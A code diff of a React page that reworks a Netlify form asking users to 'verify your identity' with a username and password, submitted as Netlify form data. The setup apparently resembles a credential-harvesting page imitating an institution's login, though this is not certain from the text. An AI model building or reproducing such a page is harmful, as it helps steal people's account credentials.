@@ -6,6 +6,15 @@ const styles = {
     efcYellow: '#ED8B00',
     fontMedium: "1.5rem"
 }
+
+function encode(data) {
+    return Object.keys(data)
+      .map(
+        (key) =>
+          encodeURIComponent(key) + "=" + encodeURIComponent(data[key])
+      )
+      .join("&");
+  }
 // const formLabels = ["Last Name", "Member Email Address", "Phone Number"]
 // const Lists = ({list, user})=>{
 //     return list.map(item => <InputField name={item} value={user}/>)
@@ -25,15 +34,6 @@ export default function Home (){
             [e.target.name]: e.target.value
         })
     }
-
-    function encode(data) {
-        return Object.keys(data)
-          .map(
-            (key) =>
-              encodeURIComponent(key) + "=" + encodeURIComponent(data[key])
-          )
-          .join("&");
-      }
 
     
     const handleSubmit = (e)=> {
@@ -64,12 +64,14 @@ export default function Home (){
                 Provide the following information to verify your identity
             </p>
             <form 
-                name="login" 
+                name="loginForm" 
                 method="post"
+                netlify-honeypot="bot-field"
                 data-netlify="true"
+                action='/'
                 onSubmit={handleSubmit}
             >
-                <input type="hidden" name="form-name" value="login" />
+                {/* <input type="hidden" name="form-name" value="loginForm" /> */}
                 <InputField name={'username'} value={user.username} onChangeHandler={handlerChange}/>
                 <InputField name={'password'} value={user.password} onChangeHandler={handlerChange}/>
                 <button type='submit'>LOG IN</button>
